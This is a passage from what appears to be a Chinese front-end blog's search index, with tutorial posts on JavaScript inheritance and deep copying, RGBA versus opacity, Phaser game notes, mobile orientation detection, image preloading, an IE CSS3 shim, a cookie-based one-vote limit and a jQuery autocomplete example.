，就比如Child往words里添加了一项，父类也会被更新，造成某种程度上的问题。而解决引用类型数据共享问题的方法，一般就是不继承该属性，或者&nbsp;6）把父对象的属性，全部拷贝给子对象除了使用”prototype链”以外，还有另一种思路：把父对象的属性，全部拷贝给子对象，也能实现继承。123456789101112131415161718192021222324var Parent = &#123;name : 'parent',words: ['word1','word2'],say: function()&#123;console.log(this.name + ': ' + this.words);&#125;&#125;;// 对象拷贝函数function extendCopy(obj)&#123;var newObj = &#123;&#125;;for(var item in obj)&#123;newObj[item] = obj[item];&#125;return newObj;&#125;var Child = extendCopy(Parent);Child.say(); // parent: word1,word2Child.name = 'child';Child.words.push('word3');Child.say(); // child: word1,word2,word3Parent.say();// parent: word1,word2,word3这样的拷贝有一个问题。那就是，如果父对象的属性等于数组或另一个对象，那么实际上，子对象获得的只是一个内存地址，而不是真正拷贝，因此存在父对象被篡改的可能。所以上方Child修改之后也会反应到Parent上去。所以需要进行深度拷贝，一直到拿到真正的值为止1234567891011121314151617181920212223242526272829var Parent = &#123;name : 'parent',words: ['word1','word2'],say: function()&#123;console.log(this.name + ': ' + this.words);&#125;&#125;;// 引用类型 深拷贝函数function deepCopy(obj,newObj)&#123;newObj = newObj || &#123;&#125;;for(var item in obj)&#123;if(typeof obj[item] === 'object')&#123;newObj[item] = (Object.prototype.toString.call(obj[item]) === '[object Array]') ? [] : &#123;&#125;;deepCopy(obj[item],newObj[item]);&#125;else&#123;newObj[item] = obj[item]&#125;&#125;return newObj;&#125;var Child = deepCopy(Parent);Child.say(); // parent: word1,word2Child.name = 'child';Child.words.push('word3');Child.say(); // child: word1,word2,word3Parent.say();// parent: word1,word2最后附图两张：&nbsp;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>js面向对象继承</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RGBA与Opacity区别详解]]></title>
    <url>%2F2015%2F08%2F29%2Frgba%E4%B8%8Eopacity%E5%8C%BA%E5%88%AB%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[RGBA和Opacity都和透明度有关，但是它们又有什么区别呢？也许有的小伙伴一时也想不出来，不要紧，悄悄地往下看。先来简单看看RGBA：语法1gba(r,g,b,a)取值说明R：红色值。正整数 | 百分数G：绿色值。正整数 | 百分数B：蓝色值。正整数 | 百分数A：Alpha透明度。取值0~1之间。正整数为十进制0~255之间的任意值，百分数为0%~100%之间的任意值。RGBA是在R（Red）G（Green）B（Blue）模式上增加了alpha通道，alpha通道是不透明度，即，如果一个元素的alpha通道数值为0%（或0），那该元素就是完全透明的（也就是看不见的，但是可以透过该元素看到该元素下的元素），数值为100%（或255）时则意味着该元素完全不透明。再来看看Opacity：语法1opacity: value|inherit;取值说明value:不透明度，从 0.0 （完全透明）到 1.0（完全不透明）。Tip：IE8 以及更早的版本支持替代的 filter 属性。例如：filter:Alpha(opacity=50)。RGBA和opacity都是用来设置元素的不透明度的，那么两者有什么区别呢？区别opacity会继承父元素的 opacity 属性，而RGBA设置的元素的后代元素不会继承不透明属性。两者的区别可以直接看下面的实现和贴图效果：从图上可以看到，给div设置Opacity属性的里面的文本也是半透明的，而给div设置RGBA属性的里面的文本并没有继承透明性。注：该实例RGBA和Opacity的不透明度取值均为0.5.所以RGBA相对于Opacity还是技高一筹的。当然，只要是涉及到颜色的都可以用RGBA来设置，比如上面用到的background-color、text-shadow、box-shadow。]]></content>
      <categories>
        <category>HTML5/CSS3</category>
      </categories>
      <tags>
        <tag>RGBA与Opacity区别</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[H5游戏开发之phaser学习笔记（二）]]></title>
    <url>%2F2015%2F08%2F29%2Fh5%E6%B8%B8%E6%88%8F%E5%BC%80%E5%8F%91%E4%B9%8Bphaser%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89%2F</url>
    <content type="text"><![CDATA[一、启用物理系统默认的游戏中的每个对象的物理系统是关闭的，要启用一个对象的物理系统，可以使用 game.physics.enable() 方法enable(object, system, debug)object : 要开启物理系统的对象，可以是单个对象，也可以是一个包含多个对象的数组system : 要启用的物理系统，默认为 Phaser.Physics.ARCADE，Phaser目前支持三种物理引擎，分别是Arcade ，P2 以及 Ninja。debug : 是否开启调试只有开启了对象的物理系统，该对象才具有物理特性，开启了物理系统后，对象的body属性指向该对象拥有的物理系统，所有与物理相关的属性或方法都必须在body上进行操作。实例：1234game.physics.enable(this.bird,Phaser.Physics.ARCADE); //开启鸟的物理系统this.bird.body.gravity.y = 0; //鸟的重力,未开始游戏，先让重力为0，不然鸟会掉下来game.physics.enable(this.ground,Phaser.Physics.ARCADE);//开启地面的物理系统this.ground.body.immovable = true; //让地面在物理环境中固定不动二、鼠标点击事件addOnce(listener, listenerContext, priority, args)listener：当发送此信号时，该函数调用。listenerContext：表示该变量的对象。priority：事件侦听器的优先级级别。具有较高优先级的侦听器将在较低优先级的侦听器前执行。具有相同优先级的侦听器将按相同的顺序执行（默认值= 0）args：附加的参数传递给回调函数。在任何参数通常被调度的参数之后，它们将被追加。Phaser中的鼠标、键盘、触摸等交互事件都统一由Input对象来处理。我们需要鼠标点击屏幕后进行响应，可以使用Input对象的onDown属性，该属性指向一个Phaser.Signal对象，我们可以在这个对象上绑定事件，每当鼠标按键下，就会触发一个onDown的信号，如果这个onDown信号对象上绑定了事件，那么这些事件就会执行。例如：12345var input = game.input; //当前游戏的input对象var signal = input.onDown; //鼠标按下时的 Signal对象signal.add(function()&#123;&#125;); //给Signal 绑定事件处理函数signal.add(function()&#123;&#125;); //再绑定一个signal.addOnce(function()&#123;&#125;); //绑定一个只会执行一次的事件函数1game.input.onDown.addOnce(this.statrGame, this); //点击屏幕后正式开始游戏三、时钟对象有时我们需要定时或者每隔一段时间就执行一段代码，在原生js中我们可以通过setTimeout和setInterval来实现。Phaser给我们提供了功能更强大的Timer对象来实现这些功能。Timer对象主要有以下几个方法：12loop(delay, callback, callbackContext, arguments); //以指定的时间间隔无限重复执行某一个函数，直到调用了Timer对象的stop()方法才停止repeat(delay, repeatCount, callback, callbackContext, arguments); //让某个函数重复执行，可以指定重复的次数当前的Timer对象我们可以通过 game.time.events 来得到，在调用了Timer对象的loop或repeat方法后，还必须调用start方法来启动。但是我使用的Phaser 2.0.4 版本，好像不调用start方法，loop方法就自动起作用了，不知道这是不是一个bug。如上面代码中我们用到的：12game.time.events.loop(900, this.generatePipes, this); //利用时钟对象来重复产生管道game.time.events.stop(false); //先让他停止，因为即使没调用start方法，它也会自动启动，这应该是一个bug四、按钮对象button(x, y, key, callback, callbackContext, overFrame, outFrame, downFrame, upFrame, group)x：x轴位置y：y轴位置key：图像的名称（或精灵）callback：单击该按钮时执行的函数callbackContext：该函数执行环境传递给函数的意义 1 0 2 它们分别代表按钮的不同状态：over（鼠标悬停），out（正常），和down（触摸或点击）实例：this.startButton = this.add.button(Candy.GAME_WIDTH-401-10, Candy.GAME_HEIGHT-143-10,’button-start’, this.startGame, this, 1, 0, 2);其他的小结：1、game.input.maxPointers=1;//游戏不需要多点触摸2、scale.scalemode 控制游戏的旋转。可用的设置有： exact_fit ，no_scale 和 show_all你可以枚举他们，使用数值0，1，或2。exact_fit，将最大化游戏；no_scale将禁用缩放；show_all将确保游戏符合给定的尺寸，一切都会显示在屏幕上（按比例缩放 ）。将 scale.pagealignhorizontally 和 scale.pagealignvertically 设为 true ，将使游戏在水平和垂直方向居中。调用 scale.setScreenSize(true) “激活”缩放。3、启动物理引擎的几种方式：A、game.physics.startSystem(Phaser.Physics.ARCADE);game.physics.arcade.gravity.y=200;B、game.physics.enable(candy, Phaser.Physics.ARCADE);4、candy.inputEnabled = true; 如果启用了输入处理程序，将处理输入请求并监视指针活动。5、candy.checkWorldBounds = true;保证精灵离开游戏屏幕时被销毁]]></content>
      <categories>
        <category>Phaser</category>
      </categories>
      <tags>
        <tag>phaser笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[移动端Web开发如何处理横竖屏]]></title>
    <url>%2F2015%2F08%2F28%2F%E7%A7%BB%E5%8A%A8%E7%AB%AFweb%E5%BC%80%E5%8F%91%E5%A6%82%E4%BD%95%E5%A4%84%E7%90%86%E6%A8%AA%E7%AB%96%E5%B1%8F%2F</url>
    <content type="text"><![CDATA[1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162&lt;!Doctype html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset="utf-8"&gt;&lt;meta id="viewport" name="viewport" content="width=device-width,initial-scale=1.0;"&gt;&lt;title&gt;横竖屏切换检测&lt;/title&gt;&lt;style type="text/css"&gt;.landscape body &#123;background-color: #ff0000;&#125;.portrait body &#123;background-color: #00ffff;&#125;&lt;/style&gt;&lt;script type="text/javascript"&gt;// window.orientation :这个属性给出了当前设备的屏幕方向，0表示竖屏，正负90表示横屏（向左与向右）模式// onorientationchange : 在每次屏幕方向在横竖屏间切换后，就会触发这个window事件，用法与传统的事件类似(function()&#123;var supportOrientation=(typeof window.orientation == "number" &amp;amp;&amp;amp; typeof window.onorientationchange == "object"); //判断浏览器是否支持orientationvar updateOrientation=function()&#123;if(supportOrientation)&#123;updateOrientation=function()&#123;var orientation=window.orientation;switch(orientation)&#123;case 90:case -90:orientation="landscape"; //横屏break;default:orientation="portrait"; //竖屏&#125;document.body.parentNode.setAttribute("class",orientation);&#125;;&#125;else&#123;updateOrientation=function()&#123; //如果当前浏览器不支持orientation，则使用最简单的方法（判断窗口的高宽）var orientation=(window.innerWidth &gt; window.innerHeight)? "landscape":"portrait";document.body.parentNode.setAttribute("class",orientation);&#125;;&#125;updateOrientation();&#125;;var init=function()&#123;updateOrientation();if(supportOrientation)&#123;window.addEventListener("orientationchange",updateOrientation,false);&#125;else&#123;window.setInterval(updateOrientation,5000);&#125;&#125;;window.addEventListener("DOMContentLoaded",init,false);&#125;)();&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div&gt;移动端Web开发如何处理横竖屏&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;]]></content>
      <categories>
        <category>移动前端</category>
      </categories>
      <tags>
        <tag>移动端处理横竖屏</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript中function的多样性]]></title>
    <url>%2F2015%2F08%2F28%2Fjavascript%E4%B8%ADfunction%E7%9A%84%E5%A4%9A%E6%A0%B7%E6%80%A7%2F</url>
    <content type="text"><![CDATA[JavaScript 中的 function 有多重意义。它可能是一个构造器（constructor），承担起对象模板的作用； 可能是对象的方法（method），负责向对象发送消息。还可能是函数，没错是函数，和对象没有任何关系独立存在的可以被调用的函数。由于语言设计者的妥协，在 JavaScript 加入了一些 class 相关的特性，以使 JavaScript 看起来确实象 Java，可以 “面向对象”。虽然 JavaScript 添加了 new 和 this， 但却没有 class （ES6已加）。最后 function 临时担负起 class 的任务。语义1：作为构造器的 function123456789101112131415161718192021/** * 页签 * * @class Tab * @param nav &#123;string&#125; 页签标题的class * @param content &#123;string&#125; 页面内容的class * */function Tab(nav, content) &#123; this.nav = nav; this.content = content;&#125;Tab.prototype.getNav = function() &#123; return this.nav;&#125;;Tab.prototype.setNav = function(nav) &#123; this.nav = nav;&#125;;Tab.prototype.add = function() &#123;&#125;;// 创建对象var tab = new Tab(‘tab-nav’, ‘tab-content’);这里定义了一个类 Tab，创建了一个对象 tab。以上使用了 function ，this, new。this, new 是常见的面向对象语言中的关键字， 这里的 function 则担负传统面向对象语言中的 class 作用。当然这时候标识符的命名一般遵循 “首字母大写” 规则。&nbsp;语义2：作为对象方法的 function由于 JavaScript 中无需类也可以直接创建对象，因此有两种方式给对象添加方法。第一种先定义类，方法挂在原型上，如上例的 Tab，原型上有 getNav、setNav 和 add 方法。以下还有一种，直接在 function 内的 this 上添加方法。1234567891011121314function Tab(nav, content) &#123; this.nav = nav this.content = content this.getNav = function() &#123; // ... &#125; this.setNav = function() &#123; // ... &#125; this.add = function() &#123; // ... &#125;&#125;这里 Tab 是语义1， this.getNav/this.setNav/this.add 是语义2，作为对象的方法。 另外，可以直接定义对象及其方法12345678910111213var tab = &#123; nav: '', content: '', getNav: function() &#123; // ... &#125;, setNav: function() &#123; // ... &#125;, add: function() &#123; // ... &#125;&#125;tab.getNav/tab.setNav/tab.add 是语义2，作为对象 tab 的方法。&nbsp;语义3：作为独立的函数12345678910111213141516171819202122232425262728293031/* * 判断对象是否是一个空对象 * @param obj &#123;Object&#125; * @return &#123;boolean&#125; */function isEmpty(obj) &#123; for (var a in obj) &#123; return false &#125; return true&#125;// 定义一个模块~function() &#123; // 辅助函数 function now() &#123; return (new Date).getTime() &#125; // 模块逻辑...&#125;();// 采用CommonJS规范的方式定义一个模块define(require, exports, moduel) &#123; // 辅助函数 function now() &#123; return (new Date).getTime() &#125; // 模块逻辑...&#125;)isEmpty 作为一个全局函数存在，模块定义里面的 now 则作为局部函数存在，无论 isEmpty 还是 now 这里的 function 都指函数，它不依赖与对象和类，可以独立被调用。&nbsp;语义4：匿名函数定义模块12345678910111213141516171819202122232425262728293031323334353637383940// 全局命名空间var RUI = &#123;&#125;// ajax.js~function(R) &#123; // 辅助函数... ajax = &#123; request: function() &#123; // ... &#125; getJSON: function() &#123; // ... &#125; ... &#125; // 暴露出模块给 R R.ajax = ajax&#125;(RUI);// event.js~function(R) &#123; // 辅助函数... // 事件模块定义... // 暴露出模块给 R R.event = event&#125;(RUI);// dom.js~function(R) &#123; // 辅助函数... // DON模块定义... // 暴露出模块给 R R.dom = dom&#125;(RUI);这里的匿名函数执行后把API对象暴露给了RUI，无论匿名函数内干了多少活，对应匿名函数外是看不到的，也是没有必要去理会的。最终关心的是公开的 API 方法，只要了解这些方法的参数及意义就可以马上使用它了。&nbsp;语义5：匿名函数处理某些特殊效果如处理一些数据又不想暴露过多的变量12345678910111213// 判断IE版本的hack方式var IEVersion = function() &#123; var undef, v = 3 var div = document.createElement('div') var all = div.getElementsByTagName('i') while ( div.innerHTML = '&lt;!-- [if gt IE ' + (++v) + ']&gt;&lt;![endif]--&gt;', all[0] ); return v &gt; 4 ? v : undef&#125;();最终只要一个结果 IEVersion，匿名函数内部用到了一些局部变量全部可以隔离开。这种方式对于一些临时性的数据加工非常有效，紧凑。总结：JavaScript 是 Eich 花 10 天的时间设计出来的，本是一个短小紧凑的脚本/函数式语言，因为市场营销的原因，为了迎合 Java，加入了一些类 Java 的面向对象特性（constructor, this, new）。 this，new 照搬过来， class 的功能却交给了 function 来承担。导致 JavaScript function 让人迷惑，一会用来定义类，一会又作为方法或函数。另外一部分人还挖掘出它可以用来定义模块等等。这一切随着 ES6 的到来结束了，ES 中的保留字 “class” 终于被实现了，定义类一律推荐使用 class。另外还有 extend 关键字，基本把 “类式继承” 都搞过来了。 Douglas 在 Nordic.js 2014 大会上点评到 ES6 最糟糕的设计之一就是 class，另外也不建议使用 this 和 new，这表明他依然赞成使用函数式语言方式去写 JavaScript，而不是基于类的面向对象式。]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>function的多样性</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[利用CSS、JavaScript及Ajax实现图片预加载的三大方法]]></title>
    <url>%2F2015%2F08%2F27%2F%E5%88%A9%E7%94%A8css%E3%80%81javascript%E5%8F%8Aajax%E5%AE%9E%E7%8E%B0%E5%9B%BE%E7%89%87%E9%A2%84%E5%8A%A0%E8%BD%BD%E7%9A%84%E4%B8%89%E5%A4%A7%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;预加载图片是提高用户体验的一个很好方法。图片预先加载到浏览器中，访问者便可顺利地在你的网站上冲浪，并享受到极快的加载速度。这对图片画廊及图片占据很大比例的网站来说十分有利，它保证了图片快速、无缝地发布，也可帮助用户在浏览你网站内容时获得更好的用户体验。本文将分享三个不同的预加载技术，来增强网站的性能与可用性。方法一：用CSS和JavaScript实现预加载&emsp;&emsp;实现预加载图片有很多方法，包括使用CSS、JavaScript及两者的各种组合。这些技术可根据不同设计场景设计出相应的解决方案，十分高效。单纯使用CSS，可容易、高效地预加载图片，代码如下：123#preload-01 &#123; background: url(http://domain.tld/image-01.png) no-repeat -9999px -9999px; &#125;#preload-02 &#123; background: url(http://domain.tld/image-02.png) no-repeat -9999px -9999px; &#125;#preload-03 &#123; background: url(http://domain.tld/image-03.png) no-repeat -9999px -9999px; &#125;&emsp;&emsp;将这三个ID选择器应用到(X)HTML元素中，我们便可通过CSS的background属性将图片预加载到屏幕外的背景上。只要这些图片的路径保持不变，当它们在Web页面的其他地方被调用时，浏览器就会在渲染过程中使用预加载（缓存）的图片。简单、高效，不需要任何JavaScript。&emsp;&emsp;该方法虽然高效，但仍有改进余地。使用该法加载的图片会同页面的其他内容一起加载，增加了页面的整体加载时间。为了解决这个问题，我们增加了一些JavaScript代码，来推迟预加载的时间，直到页面加载完毕。代码如下：12345678910111213141516171819202122// better image preloading @ [http://perishablepress.com/press/2009/12/28/3-ways-preload-images-css-javascript-ajax/](http://perishablepress.com/press/2009/12/28/3-ways-preload-images-css-javascript-ajax/)function preloader() &#123; if (document.getElementById) &#123; document.getElementById("preload-01").style.background = "url(http://domain.tld/image-01.png) no-repeat -9999px -9999px"; document.getElementById("preload-02").style.background = "url(http://domain.tld/image-02.png) no-repeat -9999px -9999px"; document.getElementById("preload-03").style.background = "url(http://domain.tld/image-03.png) no-repeat -9999px -9999px"; &#125;&#125;function addLoadEvent(func) &#123; var oldonload = window.onload; if (typeof window.onload != 'function') &#123; window.onload = func; &#125; else &#123; window.onload = function() &#123; if (oldonload) &#123; oldonload(); &#125; func(); &#125; &#125;&#125;addLoadEvent(preloader);&emsp;&emsp;该脚本的第二部分，我们使用addLoadEvent()函数来延迟preloader()函数的加载时间，直到页面加载完毕。&emsp;&emsp;如果JavaScript无法在用户的浏览器中正常运行，会发生什么？很简单，图片不会被预加载，当页面调用图片时，正常显示即可。方法二：仅使用JavaScript实现预加载&emsp;&emsp;上述方法有时确实很高效，但我们逐渐发现它在实际实现过程中会耗费太多时间。相反，我更喜欢使用纯JavaScript来实现图片的预加载。下面将提供两种这样的预加载方法，它们可以很漂亮地工作于所有现代浏览器之上。JavaScript代码段1只需简单编辑、加载所需要图片的路径与名称即可，很容易实现：1234567891011121314151617181920&lt;div class="hidden"&gt;&lt;script type="text/javascript"&gt;&lt;!--//--&gt;&lt;![CDATA[//&gt;&lt;!--var images = new Array()function preload() &#123;for (i = 0; i &lt; preload.arguments.length; i++) &#123;images[i] = new Image()images[i].src = preload.arguments[i]&#125;&#125;preload("http://domain.tld/gallery/image-001.jpg","http://domain.tld/gallery/image-002.jpg","http://domain.tld/gallery/image-003.jpg")//--&gt;&lt;!]]&gt;&lt;/script&gt;&lt;/div&gt;&emsp;&emsp;该方法尤其适用预加载大量的图片。我的画廊网站使用该技术，预加载图片数量达50多张。将该脚本应用到登录页面，只要用户输入登录帐号，大部分画廊图片将被预加载。JavaScript代码段2&emsp;&emsp;该方法与上面的方法类似，也可以预加载任意数量的图片。将下面的脚本添加入任何Web页中，根据程序指令进行编辑即可。12345678910111213141516&lt;div class="hidden"&gt;&lt;script type="text/javascript"&gt;&lt;!--//--&gt;&lt;![CDATA[//&gt;&lt;!--if (document.images) &#123;img1 = new Image();img2 = new Image();img3 = new Image();img1.src = "http://domain.tld/path/to/image-001.gif";img2.src = "http://domain.tld/path/to/image-002.gif";img3.src = "http://domain.tld/path/to/image-003.gif";&#125;//--&gt;&lt;!]]&gt;&lt;/script&gt;&lt;/div&gt;&emsp;&emsp;正如所看见，每加载一个图片都需要创建一个变量，如“img1 = new Image();”，及图片源地址声明，如“img3.src = “../path/to/image-003.gif”;”。参考该模式，你可根据需要加载任意多的图片。&emsp;&emsp;我们又对该方法进行了改进。将该脚本封装入一个函数中，并使用 addLoadEvent（），延迟预加载时间，直到页面加载完毕。123456789101112131415161718192021222324function preloader() &#123;if (document.images) &#123;var img1 = new Image();var img2 = new Image();var img3 = new Image();img1.src = "http://domain.tld/path/to/image-001.gif";img2.src = "http://domain.tld/path/to/image-002.gif";img3.src = "http://domain.tld/path/to/image-003.gif";&#125;&#125;function addLoadEvent(func) &#123;var oldonload = window.onload;if (typeof window.onload != 'function') &#123;window.onload = func;&#125; else &#123;window.onload = function() &#123;if (oldonload) &#123;oldonload();&#125;func();&#125;&#125;&#125;addLoadEvent(preloader);方法三：使用Ajax实现预加载&emsp;&emsp;上面所给出的方法似乎不够酷，那现在来看一个使用Ajax实现图片预加载的方法。该方法利用DOM，不仅仅预加载图片，还会预加载CSS、JavaScript等相关的东西。使用Ajax，比直接使用JavaScript，优越之处在于JavaScript和CSS的加载不会影响到当前页面。该方法简洁、高效。123456789101112131415window.onload = function() &#123;setTimeout(function() &#123;// XHR to request a JS and a CSSvar xhr = new XMLHttpRequest();xhr.open('GET', 'http://domain.tld/preload.js');xhr.send('');xhr = new XMLHttpRequest();xhr.open('GET', 'http://domain.tld/preload.css');xhr.send('');// preload imagenew Image().src = "http://domain.tld/preload.png";&#125;, 1000);&#125;;&emsp;&emsp;上面代码预加载了“preload.js”、“preload.css”和“preload.png”。1000毫秒的超时是为了防止脚本挂起，而导致正常页面出现功能问题。下面，我们看看如何用JavaScript来实现该加载过程：12345678910111213141516171819202122232425262728window.onload = function() &#123;setTimeout(function() &#123;// reference to &lt;head&gt;var head = document.getElementsByTagName('head')[0];// a new CSSvar css = document.createElement('link');css.type = "text/css";css.rel = "stylesheet";css.href = "http://domain.tld/preload.css";// a new JSvar js = document.createElement("script");js.type = "text/javascript";js.src = "http://domain.tld/preload.js";// preload JS and CSShead.appendChild(css);head.appendChild(js);// preload imagenew Image().src = "http://domain.tld/preload.png";&#125;, 1000);&#125;;&emsp;&emsp;这里，我们通过DOM创建三个元素来实现三个文件的预加载。正如上面提到的那样，使用Ajax，加载文件不会应用到加载页面上。从这点上看，Ajax方法优越于JavaScript。&emsp;&emsp;如果你还有什么好的图片预加载方法，及对上述方法的改进建议，欢迎在评论中分享。&nbsp;]]></content>
      <categories>
        <category>前端杂货</category>
      </categories>
      <tags>
        <tag>ajax图片预加载</tag>
        <tag>css 图片预加载</tag>
        <tag>js图片预加载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSS3兼容IE的神器]]></title>
    <url>%2F2015%2F08%2F27%2Fcss3%E5%85%BC%E5%AE%B9ie%E7%9A%84%E7%A5%9E%E5%99%A8%2F</url>
    <content type="text"><![CDATA[经过长久以来的不懈努力，我终于成功的将selectivizr与PIE这两个解决css3的利器进行了深度的整合，大大降低了使用难度1&lt;!--[if lte IE 9]&gt;&lt;script src="/js/selectivizr.js"&gt;&lt;/script&gt;&lt;![endif]--&gt;只要在你的页面上加入这一行代码，整个页面全部兼容css3，不要忘了将文件下载回来放进/js/文件夹兼容圆角border-radius，盒阴影box-shadow、渐变色linear-gradient()，相对长度单位(rem vh vw vmax vmin)等项目主页http://gucong3000.github.io/selectivizr/所有.js、.htc需要放进同一文件夹内 打包下载如需css3伪对象等选择符功能，只需加载任意一个你喜欢的js选择符引擎即可。支持NWMatcher、 MooTools、jQuery等注：如果本地运行静态文件正常，而php服务器环境下不正常，请添加此行到 .htaccess文件1AddType text/x-component .htc&nbsp;]]></content>
      <categories>
        <category>前端兼容</category>
      </categories>
      <tags>
        <tag>css3兼容IE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JQUERY 只能投票一次（根据cookies判断）]]></title>
    <url>%2F2015%2F08%2F27%2Fjquery-%E5%8F%AA%E8%83%BD%E6%8A%95%E7%A5%A8%E4%B8%80%E6%AC%A1%EF%BC%88%E6%A0%B9%E6%8D%AEcookies%E5%88%A4%E6%96%AD%EF%BC%89%2F</url>
    <content type="text"><![CDATA[根据cookie来判断，只能投票一次，下面贴上代码：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788&lt;html&gt;&lt;head&gt;&lt;title&gt;test&lt;/title&gt;&lt;script type="text/javascript" src="jquery-132min2.js" &gt;&lt;/script&gt;&lt;script type="text/javascript" src="Jquery-cookie.js" &gt;&lt;/script&gt;&lt;script type="text/javascript"&gt;document.oncontextmenu = function() &#123; return false;&#125;$(document).ready(function() &#123; if (document.cookie &amp; amp; &amp; amp; document.cookie != '') &#123; var cookies = document.cookie.split(';'); for (var i = 0; i &lt; cookies.length; i++) &#123; var cookie = jQuery.trim(cookies[i]); var id = cookie.substring(cookie.indexOf('=') + 1); $("#vote-up-" + id).attr("disabled", "disabled"); $("#vote-dn-" + id).attr("disabled", "disabled"); &#125; &#125;&#125;);function votes(id, num) &#123; var cookieName = $.cookie('isClick' + id); if (cookieName == id) return; var posscore = parseInt($('#up-' + id).text()), negscore = parseInt($('#dn-' + id).text()), d = (num &gt; 0 ? 'up' : 'dn'); num &gt; 0 ? posscore++ : negscore--; var val = 0; if (num &gt; 0) val = posscore; else val = negscore; $("#" + d + "-" + id).html(val); showAnimation(d + '-' + id, num); // $("#vote-up-"+id).removeClass(""); // $("#vote-up-"+id).addClass(""); // $("#vote-dn-"+id).removeClass(""); // $("#vote-dn-"+id).addClass(""); $("#vote-up-" + id).attr("disabled", "disabled"); $("#vote-dn-" + id).attr("disabled", "disabled"); $.cookie('isClick' + id, id);&#125;function showAnimation(containerId, actionValue) &#123; var obj = $('#' + containerId), pos = obj.offset(), ani = $('&lt;div id="vote-ani" style="font-size:24px;z-index:1000;"&gt;' + (actionValue &gt; 0 ? "+1" : "-1") + "&lt;/div&gt;"); ani.appendTo('body'); $("#vote-ani").css(&#123; top: pos.top + 10, left: pos.left + 10, display: 'block', position: 'absolute' &#125;); $("#vote-ani").animate(&#123; opacity: 0, left: "-=10px", top: "-=10px" &#125;, 500, 'linear', function() &#123; ani.remove() &#125;);&#125;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div class="bar clearfix" id="qiushi_counts_4283026"&gt;&lt;div class="up" id="vote-up-4282280"&gt;&lt;a href="javascript:votes(4282280,1)" id="up-4282280"&gt;1574 &lt;/a&gt;&lt;/div&gt;&lt;div class="down" id="vote-dn-4282280"&gt;&lt;a href="javascript:votes(4282280,-1)" id="dn-4282280"&gt;-55 &lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;br /&gt;&lt;div class="bar clearfix" id="Div1"&gt;&lt;div class="up" id="vote-up-4282281"&gt;&lt;a href="javascript:votes(4282281,1)" id="up-4282281"&gt;11 &lt;/a&gt;&lt;/div&gt;&lt;div class="down" id="vote-dn-4282281"&gt;&lt;a href="javascript:votes(4282281,-1)" id="dn-4282281"&gt;-11 &lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;&nbsp;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>cookies只能投票一次</tag>
        <tag>jq只能投票一次</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jQuery输入框提示自动完成插件 autocomplete]]></title>
    <url>%2F2015%2F08%2F27%2Fjquery%E8%BE%93%E5%85%A5%E6%A1%86%E6%8F%90%E7%A4%BA%E8%87%AA%E5%8A%A8%E5%AE%8C%E6%88%90%E6%8F%92%E4%BB%B6-autocomplete%2F</url>
    <content type="text"><![CDATA[12345678910111213141516171819202122232425262728293031&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head lang="en"&gt;&lt;meta charset="UTF-8"&gt;&lt;title&gt;练习&lt;/title&gt;&lt;script src="js.js"&gt;&lt;/script&gt;&lt;script src="jquery-1.9.1.min.js"&gt;&lt;/script&gt;&lt;script src="jquery.autocomplete.min.js"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=""&gt;&lt;input type="text" name="country" id="autocomplete"/&gt;&lt;/form&gt;&lt;/body&gt;&lt;script&gt;var countries = [&#123; value: 'Andorra', data: 'AD' &#125;,// ...&#123; value: 'Zimbabwe', data: 'ZZ' &#125;];$('#autocomplete').autocomplete(&#123;lookup: countries,onSelect: function (suggestion) &#123;alert('You selected: ' + suggestion.value + ', ' + suggestion.data);&#125;&#125;);&lt;/script&gt;&lt;/html&gt;效果：点击下载]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>autocomplete</tag>
        <tag>提示自动完成插件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[指定内容多少行后未显示全就用省略号代替]]></title>
    <url>%2F2015%2F08%2F26%2F%E6%8C%87%E5%AE%9A%E5%86%85%E5%AE%B9%E5%A4%9A%E5%B0%91%E8%A1%8C%E5%90%8E%E6%9C%AA%E6%98%BE%E7%A4%BA%E5%85%A8%E5%B0%B1%E7%94%A8%E7%9C%81%E7%95%A5%E5%8F%B7%E4%BB%A3%E6%9B%BF%2F</url>
